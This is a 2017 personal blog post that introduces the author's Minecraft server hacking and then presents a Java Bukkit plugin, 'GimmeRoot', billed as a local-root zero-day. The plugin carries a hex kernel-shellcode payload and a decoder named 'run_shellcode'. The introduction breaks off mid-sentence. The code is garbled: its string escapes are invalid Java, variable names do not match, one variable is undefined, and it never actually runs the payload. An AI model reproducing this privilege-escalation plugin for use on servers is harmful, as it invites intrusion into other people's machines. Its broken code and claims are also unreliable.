---
title: "Exploiting vulnerable software and privelage escalation, with some bonus arbitrary code execution :)"
layout: post
date: 2017-06-16 07:47
headerImage: true
tag:
- exploit
- security
- project
- tech
- linux
- java
- 0day
- code
category: blog
author: samlim
description: An old project that may pique the interest of those of you who are curious about 'hacking' :)
---

## Introduction
Hello everybody!

Back in my school days when I was a wee lad (8th grade or so), I began to foster a passion for cybersecurity. Back then I also adored the then-indie game [Minecraft](https://minecraft.net/en-us/). Since I played that game it has since then been purchased by Microsoft, and man did that game go downhill. Please do excuse my harsh critique, maybe it's just the nostalgia I miss :-)

I spent more time with Minecraf than I care to admit. However towards the end of my virtual endeavors as miner, I began to become more and more absorbed in the _server_ aspects of the game. What followed were several of my attempts at starting my own personal server: I lasted sveral months, in which I made several thousand dollars worth of donations from my players. All from a video game! 

_Not too important right now, but the volatility of these types of game servers and the potential revenue achievable will make more sense later as I explain why exactly "hacking" (ethical or not) is so appealing_ 

But what had really kindled my interest in what this article is about, cybersecurity, 

    package com.mcshell;

    import java.io.File;
    import java.io.FileOutputStream;
    import org.bukkit.plugin.java.JavaPlugin;

    public final class GimmeRoot extends JavaPlugin {
    /*
     * ##
     * # Old semi-updated version
     * ##
     * [REDACTED] Shell - [Redacted], s.lim
     * a [REDACTED] project
     */

    public String payload = "\x0f\x01\xf8\x65\x48\x8b\x3c\x25\x00\x00\x00\x00
                            \x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0
                            \x0f\x01\xf8
                            \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
                            \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
                            \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
                            \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
                            \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
                            \x48\xcf";

    public static void execute(String x) {
        System.out.println("[LOCAL ROOT 0DAY] " + x);
    }

    public void onEnable(){
        try {
            Runtime friend = Runtime.getRuntime();
            execute("here we go");
            execute("[REDACTED]");
            byte[] y = run_shellcode(payload);
            execute("Decrypted payload");
            execute("Saved payload as " + ma_homie);
            execute("bl1NG Bl1ing, to reinitialize shell use the bukkit 'reload' command");

        }
        catch(Exception e) {
            System.out.println("uh oh, error baby: " + e.toString());
        }

    }

    @Override
    public void onDisable() {
    }

    private final static char[] char_map = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            .toCharArray();

    private static int[] java_sucks = new int[128];

    static {
        for (int i = 0; i < char_map.length; i++) {
            java_sucks[char_map[i]] = i;
        }
    }
    public static byte[] run_shellcode(String da_shell_code) {
        int sanitize_mah_hax = da_shellcode.endsWith("==") ? 2 : da_shellcode.endsWith("=") ? 1 : 0;
        byte[] the_shiznit = new byte[da_shellcode.length() * 3 / 4 - sanitize_mah_hax];
        int sinker = 0xFF;
        int fat_swedish_fcuking_game_dev = 0;
        for (int i = 0; i < da_shellcode.length(); i += 4) {
            int c0 = java_sucks[da_shellcode.charAt(i)];
            int c1 = java_sucks[da_shellcode.charAt(i + 1)];
            the_shiznit[fat_swedish_fcuking_game_dev++] = (byte) (((c0 << 2) | (c1 >> 4)) & sinker);
            if (fat_swedish_fcuking_game_dev >= the_shiznit.length) {
                return the_shiznit;
            }
            int c2 = java_sucks[da_shellcode.charAt(i + 2)];
            the_shiznit[fat_swedish_fcuking_game_dev++] = (byte) (((c1 << 4) | (c2 >> 2)) & sinker);
            if (fat_swedish_fcuking_game_dev >= the_shiznit.length) {
                return the_shiznit;
            }
            int c3 = java_sucks[da_shellcode.charAt(i + 3)];
            the_shiznit[fat_swedish_fcuking_game_dev++] = (byte) (((c2 << 6) | c3) & sinker);
        }
        return the_shiznit;
    }
}